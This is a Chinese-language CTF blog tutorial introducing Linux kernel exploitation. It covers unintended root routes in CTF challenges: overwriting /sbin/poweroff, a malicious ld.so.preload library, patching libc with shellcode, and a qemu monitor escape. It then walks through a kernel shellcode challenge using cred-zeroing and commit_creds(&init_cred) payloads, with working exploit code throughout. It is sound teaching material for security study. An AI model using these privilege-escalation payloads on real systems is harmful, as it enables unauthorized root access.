---
title: "Kernel - How2Kernel 0x00: Environment and Basic LPE"
date: 2024-01-18 19:02:34
tags:
  - Kernel
  - tutorial
category: Kernel
---

> PWN 手的常规学习路线包括：栈 -> 堆（用户态）-> 内核 -> ？，无论后面的路线是嵌入式、浏览器、异架构 PWN，内核是现在国内外赛事难题的集中考察点，企业招人也会看重这方面的能力（偏向于安卓内核），此外了解内核的利用思路对一个 PWN 手的成长也是受益无穷的。
>
> 所以可以说：一个一流战队的主力 PWN 手是必须要了解内核 PWN 的。
>
> 欢迎踏上 Kernel Pwn 的旅途：

---

**目录：**

- [Environment](#Environment)
- [Introduction to Kernel Pwn](#Introduction-to-Kernel-Pwn)
  - [提权](#提权)
  - [非预期解](#非预期解)
    - [文件权限设置不当](#文件权限设置不当)
      - [/sbin/poweroff 可写](#sbin-poweroff-可写)
        - [Chal-0x00: Hackergame-2022-no_open](#Chal-0x00-Hackergame-2022-no-open)
        - [Chal-0x01: TPCTF-2023-core](#Chal-0x01-TPCTF-2023-core)
      - [/etc 目录下可写](#etc-目录下可写)
      - [libc 可写](#libc-可写)
    - [qemu 参数问题](#qemu-参数问题)
    - [CVE](#CVE)
- [内核漏洞提权](#内核漏洞提权)
  - [Chal-0x02: JingQiCTF-2023-rootcode](#Chal-0x02-JingQiCTF-2023-rootcode)
    - [Analysis](#Analysis)
    - [Debugging](#Debugging)
    - [Exploitation](#Exploitation)
      - [Solution-1: Change Current Cred](#Solution-1-Change-Current-Cred)
      - [Solution-2: Commit Root Cred](#Solution-2-Commit-Root-Cred)
- [References](#References)

---

# Environment

> Kernel Pwn 听起来令人畏惧，但上手却可能比用户态 pwn 更迅速一些：
>
> 你只需要在此前用户态 pwn 的环境基础上再用包管理器装一个 qemu 就可以了。

我的 kernel 模板可以在 github 仓库中找到：[pwn-scripts](https://github.com/AvavaAYA/pwn-scripts/tree/main/kernel_template/c_template)，其中包括了编译和调试的脚本。

<!-- TODO: 增加对本地环境的描述，增加模版使用指南 -->

<!-- TODO: 增加对内核模块的解释与例子 -->

---

# Introduction to Kernel Pwn

Kernel 的基础概念在这里不做过多讨论，因为：

1. 这些内容应该在 OS 等课程中详细介绍，~~而笔者的 OS 成绩并不喜人，~~为避免产生负面的误导，这里不做讨论；

2. 在最开始讨论这些概念意义不大，把重点放在 PWN 上，**PWN 是通过实践来学习的（调试对 PWN 很重要）**；

Kernel PWN 的目标往往是提权（escalation），即给出一个低权限的任意代码执行权限，攻击者编写恶意代码上传到目标机器，运行后获得了更高（往往是 root）权限：

|      | Kernel PWN             |
| ---- | ---------------------- |
| 环境 | Linux（若无特殊说明）  |
| 前提 | 低权限下的代码执行     |
| 目标 | 提权（获得 root 权限） |

## 提权

> 在一个低权限的 shell 中，找到系统的漏洞并加以利用，最终拿到 root 权限——这是一种非常经典的 PWN 思路~~，不感觉非常浪漫吗（）~~。

内核漏洞利用固然是提权的强力手段，但是很多时候存在更简单的方法，例如 [ld.so + suid](https://eastxuelian.nebuu.la/CVE/CVE-2023-4911/)。

如果你此前没有接触过 Kernel PWN，但在某次比赛中发现一道 Kernel 题被很多队伍解出来了，那下面的内容正是你所亟需的。

## 非预期解

> 提权的方法有很多，难以面面俱到，这里说一下常见的 kernel 题目非预期解法。
>
> 只放一些常见的（用烂了的）非预期解，解题的同时也供出题人自查：

![meme-0x00](/Kernel/Kernel-How2Kernel-0x00-Foundation/images/meme-0x00.jpeg)

### 文件权限设置不当

> 此处存在问题的关键在于 `init` 文件是以 `root` 权限调用的，若其内部又调用了其它可写的文件，则恶意篡改这些可执行文件就能带来提权。

#### /sbin/poweroff 可写

这是最近很常见，利用起来也非常简单的一种非预期情况，利用时视 `init` 脚本的具体情况来决定受害文件（这里是 `/sbin/poweroff`），而写入内容往往是：

```bash
cd sbin

rm poweroff

cat << EOF > ./poweroff ; chmod +x ./poweroff
#!/bin/sh
/bin/sh
EOF

exit
```

利用之所以能成功，是因为出题者没有注意到 `init` 脚本可能会调用到的命令的属主并非 `root` 而是 `ctfer`，这导致我们能够篡改 `poweroff` 的内容进而让 init 脚本运行实现提权。

##### Chal-0x00: Hackergame-2022-no_open

> 当时我对这些东西一知半解，作为验题人却没有注意到这些问题，sad😞

- [attachments](https://github.com/AvavaAYA/ctf-writeup-collection?tab=readme-ov-file#hackergame-2022-jeopardy)

进入 `/sbin` 目录发现其中文件到属主都并非 root，因此可以用上面到方法篡改，实现利用。

##### Chal-0x01: TPCTF-2023-core

- [attachments](https://github.com/AvavaAYA/ctf-writeup-collection?tab=readme-ov-file#tpctf-2023-jeopardy)

#### /etc 目录下可写

这个情况比较少见，可能出现在特殊构造到题目中，如上面的 [Chal-0x00: Hackergame-2022-no_open](#chal-0x00-hackergame-2022-no_open)，其中 suid 程序 chall 的属主为 root，则可以借助它，篡改其动态链接库来实现利用。

不过 suid 程序不会从环境变量 `LD_PRELOAD` 加载指定动态链接库（[man-page](https://man7.org/linux/man-pages/man8/ld.so.8.html)），这时候可以改 `/etc/ld.so.preload` 为恶意 so 文件。

```c
// gcc -fPIC -shared -o get_root.so get_root.c -nostartfiles

#include <stdio.h>
#include <stdlib.h>
#include <sys/types.h>
#include <unistd.h>

void _init() {
    unsetenv("LD_PRELOAD");
    setgid(0);
    setuid(0);
    system("/bin/sh");
}
```

在构造好恶意动态链接库后，编译、压缩、上传、解压、改写 `/etc/ld.so.preload` 完成利用：

```bash
gcc -fPIC -shared -o get_root.so get_root.c -nostartfiles

strip ./get_root.so

gzip ./get_root.so

cat ./get_root.so.gz | base64

# 上传

/ $ cat ./tmp/get_root.so.gz.b64 | base64 -d > ./tmp/get_root.so.gz
/ $ gzip -d ./tmp/get_root.so.gz
/ $ vi ./etc/ld.so.preload
/ $ /chall
/ # ls
bin      etc      init     linuxrc  sbin     usr
chall    flag2    lib      proc     sys      var
dev      home     lib64    root     tmp
/ # whoami
whoami: unknown uid 0
/ # cat flag2
flag{testFLAGinROOTdirkjasdbashd12ye9}
```

#### libc 可写

相当于上种方法的进阶版，直接 patch libc 中的某个函数来实现利用（和 ld.so + suid 提权时的构造是一个思路），在 `/lib64/libc.so.6` 可写时可以利用。

例如 [Chal-0x01: TPCTF-2023-core](#chal-0x01-tpctf-2023-core) 中，可以改 libc 的 exit 函数为 orw，在 shell 中输入 exit 即可完成利用：

- 找偏移：

```bash
nm -D ./libc.so.6 | grep exit

00000000000bf4f0 T _exit@@GLIBC_2.2.5
```

- 利用代码：

```c
// patch libc的exit函数为orw的shellcode，然后直接exit。

#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#define FILENAME "/lib64/libc.so.6" // 文件路径
#define OFFSET 0xBF4F0              // 写入偏移量
unsigned char data[] = {
    104, 96,  102, 1,   1,   129, 52,  36,  1,   1,   1,   1,   72,  184,
    47,  114, 111, 111, 116, 47,  102, 108, 80,  72,  137, 231, 49,  210,
    49,  246, 106, 2,   88,  15,  5,   72,  137, 199, 49,  192, 106, 64,
    90,  72,  137, 230, 15,  5,   106, 1,   95,  72,  137, 194, 72,  137,
    230, 106, 1,   88,  15,  5,   49,  255, 106, 60,  88,  15,  5
};

int main() {
    FILE *file = fopen(FILENAME, "r+b");
    if (file == NULL) {
        perror("Failed to open file");
        return 1;
    }

    // 将文件指针移动到指定偏移量
    if (fseek(file, OFFSET, SEEK_SET) != 0) {
        perror("Failed to seek file");
        fclose(file);
        return 1;
    }

    // 写入数据
    if (fwrite(data, sizeof(char), sizeof(data), file) != sizeof(data)) {
        perror("Failed to write data");
        fclose(file);
        return 1;
    }

    fclose(file);
    return 0;
}
```

> 其实 core 这道题还可以用 `dirty_pipe` 去写 busybox 实现利用\[4\]，关于标准解法也在这篇文章中。

### qemu 参数问题

最近没怎么见到了，前几年用 qemu 的题倒是很常见：即启动脚本中，qemu 都没有关 monitor（-monitor /dev/null），所以可以直接发送控制字符组合 `b"\x01c"`，使得远程的 qemu 进入 monitor 模式，然后即可执行 qemu 外的系统命令：

例如某次华为杯的嵌入式题全都被这样非预期了：

```python
from pwn import *
context(log_level='debug')

io = remote("remoteIP", remotePORT)
io.send(b"\x01c")
sleep(1)
io.sendline(b"")
io.sendlineafter("(qemu) ",'migrate "exec: strings /rootfs.img | grep flag"')
io.interactive()
```

### CVE

CVE 带来的非预期在 kernel 题中比较少见，因为出题人往往会用较新的内核版本，但是在其他题目中可能存在，此前在某场 AWD 比赛中笔者就使用 [CVE-2023-4911](https://eastxuelian.nebuu.la/CVE/CVE-2023-4911/) 实现了提权。

由于 CVE 带来的非预期解往往存在时效性，在此不多赘述。

---

# 内核漏洞提权

> 开场白环节至此结束，接下来正式进入内核漏洞的利用部分。

Kernel 漏洞的挖掘，**大部分** CTF 题目都是在对内核模块（Loadable Kernel Modules, LKMs）进行漏洞挖掘，其文件格式和用户态的可执行程序相同（ELF）。模块通常用来实现一种文件系统、一个驱动程序或者其他内核上层的功能。

Kernel 中的漏洞如何导致提权？通俗来讲，kernel 中的模块运行在更高的权限层级下，用户态程序通过系统调用来与其交互（包括 ioctl），若其中存在漏洞就可以由用户构造出特殊的操作劫持内核的控制流，来实现某种高权限的操作（包括修改用户态程序进程结构体 `cred struct` 改变权限）。

## Chal-0x02: JingQiCTF-2023-rootcode

> 这是一道来自 2023 年首届京麒杯的签到内核题（用于开启 soloCTF），但是现场选手们都做太慢了以至于主办方不得不现场放出另一道签到题。

- [attachments](https://github.com/AvavaAYA/ctf-writeup-collection?tab=readme-ov-file#solo-rootcode)

### Analysis

作为系列博客中的第一道正式例题，先介绍一些基本操作：

对于内核题目，往往会给出以下三个文件：

- `bzImage`：压缩过的内核镜像，可以使用 [vmlinux-to-elf](https://github.com/marin-m/vmlinux-to-elf) 还原为可导入 ida 的 vmlinux 内核镜像，恢复部分符号。当然也可以到高性能主机上重新编译一份带符号表的镜像。

- `rootfs.cpio`：存档文件的文件格式：

  - 解包：`mkdir ./rootfs ; cd ./rootfs ; cpio -idm < ../rootfs.cpio`

  - 重新打包：`find . -print0 | cpio --null -ov --format=newc >../rootfs.cpio`

  - 有时候会对出来的 cpio 文件进行 gzip 压缩。

- `run.sh`：运行脚本，会提供一些信息。

而对于 img 格式的文件也是类似的，借助工具 [jefferson](https://github.com/sviehb/jefferson) 或者直接挂载到本地目录都可以，总归出题人不会想在这种地方为难选手的。

正如前文所述，内核题往往研究的对象是内核模块（`ko` 文件），这里解包后直接就能找到 `vuln.ko`，可以照例拖入 ida 中进行分析：

![ida screenshot0](/Kernel/Kernel-How2Kernel-0x00-Foundation/images/figure-0x01.png)

可以发现各个库函数功能基本与其名字对应，而在 `chardev_init` 中注册了一个名为 `vuln` 的字符设备，对其的操作在 `chardev_fops` 中注册，其中包括 write、open、release 系统调用：

```c
.data:0000000000000560 ; file_operations chardev_fops
.data:0000000000000560 chardev_fops    file_operations <0, 0, 0, offset device_write, 0, 0, 0, 0, 0, 0, 0, 0,\
.data:0000000000000560                                         ; DATA XREF: chardev_init+70↑o
.data:0000000000000560                                  0, 0, offset device_open, 0, offset device_release, \
.data:0000000000000560                                  0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0>
.data:0000000000000560 _data           ends
```

依次检查各个函数，发现只有 `device_write` 函数值得注意，其中 `v4` 对应 `write` 系统调用的长度参数，因此这段代码即为从用户态中读 0x100 个字节的 shellcode 到内核态中执行，因此是一道 Kernel pwn 中的 shellcode 题目：

![ida screenshot1](/Kernel/Kernel-How2Kernel-0x00-Foundation/images/figure-0x00.png)

### Debugging

调试永远是 PWN 里面关键的一步，在有的方向（如嵌入式）可能是决定成败的一步。

先给出我的常用调试脚本，并进行调整于解释：

```bash
#!/usr/bin/env bash

sudo -E pwndbg ./vmlinux.bin -ex "set architecture i386:x86-64" \
	-ex "target remote localhost:1234" \
	-ex "add-symbol-file ./rootfs/vuln.ko $1" \
	-ex "b *(device_write + 0x14C - 0x90)" \
	-ex "c" # where calling shellcode
```

相比常规用户态题目，Kernel 的调试步骤稍微复杂一些，需要额外做以下步骤：

1. 调试前准备：

   - gdb 及其插件不必多说，pwndbg 若出现问题可以换 gef；

   - 在 qemu 启动脚本最后加上 `-s` 选项，默认会开放调试端口 1234；

2. 找地址：

   - 修改启动脚本 `init`：关闭 `kptr` 并使用 root 权限启动，重新打包；

   - 拥有 root 权限并关闭 kptr 后，可以用：

     - `cat /proc/modules` 或 `lsmod` 来查看 LKMs 的地址，接下来用 `add-symbol-file ./rootfs/vuln.ko $1` 加载模块的符号信息到正确地址；

     - 这里把断点打在了 `device_write` 调用 shellcode 的地方，因为这道题我们只对传入的 shellcode 感兴趣；

3. 运行调试：

   - 内核函数的地址信息可以到 `/proc/kallsyms` 中去找，例如 `grep commit_creds /proc/kallsyms`；

   - 剩下的操作都和用户态类似。

关于结构体，可以用 `vmlinux-to-elf` 等工具从 `bzImage` 获取到 kernel 具体版本后到 [elixir.bootlin.com](https://elixir.bootlin.com/linux/latest/source) 中搜索查看，也可以直接去下载对应源码，编译符号信息。

```c
// author: @eastXueLian
// usage : eval $buildPhase
// You can refer to my nix configuration for detailed information.

#include "libLian.h"

int fd;

int main() {
    fd = open("/dev/vuln", 2);
    char payload[] = "\xef\xbe\xad\xde\x00\x00\x00\x00\xef\xbe\xad\xde\x00\x00\x00\x00";

    write(fd, payload, 0x100);

    get_shell();
    return 0;
}
```

先编写基础利用代码进行调试，确认漏洞存在并且可以运行写入的 shellcode：

![figure-0x02 gdb](/Kernel/Kernel-How2Kernel-0x00-Foundation/images/figure-0x02.png)

### Exploitation

在我们第一道 kernel Pwn 题的利用部分，先来了解一下内核对进程权限的识别：

内核会通过判断进程的 `task_struct` 结构体中的 `cred` 指针来索引 `cred` 结构体：

```c
struct cred {
	atomic_t	usage;
	kuid_t		uid;		/* real UID of the task */
	kgid_t		gid;		/* real GID of the task */
	kuid_t		suid;		/* saved UID of the task */
	kgid_t		sgid;		/* saved GID of the task */
	kuid_t		euid;		/* effective UID of the task */
	kgid_t		egid;		/* effective GID of the task */
	kuid_t		fsuid;		/* UID for VFS ops */
	kgid_t		fsgid;		/* GID for VFS ops */
	unsigned	securebits;	/* SUID-less security management */
	kernel_cap_t	cap_inheritable; /* caps our children can inherit */
	kernel_cap_t	cap_permitted;	/* caps we're permitted */
	kernel_cap_t	cap_effective;	/* caps we can actually use */
	kernel_cap_t	cap_bset;	/* capability bounding set */
	kernel_cap_t	cap_ambient;	/* Ambient capability set */
	struct user_struct *user;	/* real user ID subscription */
	struct user_namespace *user_ns; /* user_ns the caps and keyrings are relative to. */
	struct ucounts *ucounts;
	struct group_info *group_info;	/* supplementary groups for euid/fsgid */
	/* RCU deletion */
	union {
		int non_rcu;			/* Can we skip RCU deletion? */
		struct rcu_head	rcu;		/* RCU deletion hook */
	};
};
```

简单来说，如果 `cred` 结构体成员中的 `uid` 到 `fsgid` 都为 0，那一般就会认为进程具有 root 权限（通常写前 0x30 字节为 0 即可）。

#### Solution-1: Change Current Cred

> 根据 gs 相对偏移直接定位并修改 `current_cred`。

根据上述思路，结合我们能够执行 shellcode 的能力，再加上 LKM 中执行 shellcode 结束后是可以正常返回的（因此不需要手动恢复状态之类的事情），因此要做的只有：

1. 找到 `current_cred` 地址；

2. 往里面塞 0；

3. `ret;`，此时当前进程就有 root 权限来，直接用 system 起一个 shell 就可以了。

那 `current_cred` 在什么地方呢？这个也简单，我们自己不知道上哪找，直接到源码里去参考其它函数就行了，源码中有很多地方都涉及到了获取当前 task 并从中取出 `real_cred` 的操作，例如 [`commit_creds` 函数的开头](https://elixir.bootlin.com/linux/v6.1.61/source/kernel/cred.c#L447)：

```c
// linux/v6.1.61/source/kernel/cred.c#L447
int commit_creds(struct cred *new)
{
	struct task_struct *task = current;
	const struct cred *old = task->real_cred;
// ...
```

又到 ida 或 gdb 中找到与之相对应的汇编代码：

```c
pwndbg> x/32i 0xffffffff881bb400
   0xffffffff881bb400:  nop    DWORD PTR [rax+rax*1+0x0]
   0xffffffff881bb405:  push   r12
   0xffffffff881bb407:  mov    r12,QWORD PTR gs:0x20cc0
   0xffffffff881bb410:  push   rbp
   0xffffffff881bb411:  push   rbx
   0xffffffff881bb412:  mov    rbp,QWORD PTR [r12+0x7d0]
```

最终写出如下 shellcode：

```c
	[BITS 64]

	mov r12, qword [gs:0x20cc0]
	mov r12, [r12 + 0x7d0]
	mov qword [r12], 0
	mov qword [r12+8], 0
	mov qword [r12+0x10], 0
	mov qword [r12+0x18], 0
	mov qword [r12+0x20], 0
	mov qword [r12+0x28], 0
	ret
```

用脚本：

```bash
nasm -f bin -o ./exp.bin ./exp.s

BINARY_FILE="./exp.bin"
C_SOURCE_FILE="./exp.c"

HEX_PAYLOAD=$(xxd -p $BINARY_FILE | fold -w2 | sed 's/^/\\x/' | tr -d '\n')
sed -i "s/char payload\[\] = \".*\";/char payload[] = \"$HEX_PAYLOAD\";/" $C_SOURCE_FILE
```

塞到 exp.c 中编译上传后即可完成利用。

#### Solution-2: Commit Root Cred

> `commit_creds(&init_cred)`

在较老版本中，有一条常见的提权利用链：`commit_creds(prepare_kernel_cred(0))`，但是近期 kernel 更新中这条利用链失效了，因为 `prepare_kernel_cred(0)` 不再返回 root 权限的 cred：

> 这里是否还能利用存疑，我查找了最新版的 kernel 源码（[6.8.1](https://elixir.bootlin.com/linux/v6.8.1/source/kernel/cred.c#L634)）发现确实已经无法利用，若参数为 NULL 则会直接返回 NULL；但是在较新的版本（检查了 [6.1.61](https://elixir.bootlin.com/linux/v6.1.61/source/kernel/cred.c#L726)）是仍然能够实现利用的，故这种较简单的方法在比赛中未尝不可一试。

这时候就要想其它办法来获得一个 root cred 了，最容易想到的就是 `init_cred`，在有调试信息的 kernel 中可以直接从符号表获得其 `kaslr` 偏移（`p &init_cred`），但是现在很多题都不会给调试信息，这时候确实可以用 config 去编译一份调试信息，但更简单的方法还是从其它函数里「借鉴」。

1. 获取 kaslr 偏移：

KASLR 和 ASLR 类似，应对方法也差不多：找一处泄漏然后算相对偏移。

而本题直接提供了写 shellcode 的能力，泄漏自然不在话下，可以考虑从栈上取残留数据：

2. 定位 `init_cred`

这也是我在比赛中使用的办法，其中难点在于获取 `init_cred` 的地址，可以在源码中搜索对其对引用，找到 keyring 相关的 [`get_user_register`](https://elixir.bootlin.com/linux/v6.1.61/source/security/keys/process_keys.c#L38) 函数，其中：

```c
static struct key *get_user_register(struct user_namespace *user_ns)
{
	struct key *reg_keyring = READ_ONCE(user_ns->user_keyring_register);

	if (reg_keyring)
		return reg_keyring;

	down_write(&user_ns->keyring_sem);

	/* Make sure there's a register keyring.  It gets owned by the
	 * user_namespace's owner.
	 */
	reg_keyring = user_ns->user_keyring_register;
	if (!reg_keyring) {
		reg_keyring = keyring_alloc(".user_reg",
					    user_ns->owner, INVALID_GID,
					    &init_cred,
					    KEY_POS_WRITE | KEY_POS_SEARCH |
					    KEY_USR_VIEW | KEY_USR_READ,
					    0,
					    NULL, NULL);
		if (!IS_ERR(reg_keyring))
			smp_store_release(&user_ns->user_keyring_register,
					  reg_keyring);
	}

	up_write(&user_ns->keyring_sem);

	/* We don't return a ref since the keyring is pinned by the user_ns */
	return reg_keyring;
}
```

`keyring_alloc` 的参数很有特点，`/proc/kallsyms` 中找不到 `get_user_register`，却能找到其上层引用 [`look_up_user_keyrings`](https://elixir.bootlin.com/linux/v6.1.61/source/security/keys/process_keys.c#L74) 的函数地址，去 ida 看其反汇编代码找到 `&init_cred`：

![ida screenshot1](/Kernel/Kernel-How2Kernel-0x00-Foundation/images/figure-0x03.png)

3. `commit_creds(&init_cred)` 完成利用。

```c
	[BITS 64]

	mov  r14, qword [rsp + 0x20]
	sub  r14, 0x24c4b5
	sub  r14, 0xffffffff811bb400
	mov  rdi, r14
	add  rdi, 0xFFFFFFFF83676840
	mov  rdx, r14
	add  rdx, 0xffffffff811bb400
	call rdx
	ret
```

---

# References

\[1.\] [2022 USTC Hackergame WriteUp 0x03](https://tttang.com/archive/1805/#toc_2) . _MiaoTony_

\[2.\] [Hackergame 2022 (第九届中科大信安赛) Writeup 0x02](https://blog.gzti.me/posts/2022/f8551307/index.html#%E8%AF%BB%E4%B8%8D%E5%88%B0-%E6%89%93%E4%B8%8D%E5%BC%80) . _GZTime_

\[3.\] [TPCTF 2023 Writeup](https://blog.xmcve.com/2023/11/28/TPCTF2023-Writeup/#title-3) . _星盟安全团队_

\[4.\] [slab/0x40 UAF TPCTF2023 - core 一题多解](https://blog.csdn.net/qq_61670993/article/details/134754416) . _XiaozaYa_

\[5.\] [XCTF 华为高校挑战赛决赛 嵌入式赛题 非预期解](https://xuanxuanblingbling.github.io/ctf/pwn/2022/09/19/harmony/) . _xuanxuanblingbling_

\[6.\] [CTF-wiki pwn kernel introduction-to-kernel-pwn](https://ctf-wiki.org/pwn/linux/kernel-mode/aim/privilege-escalation/change-self/) . _arttnba3_
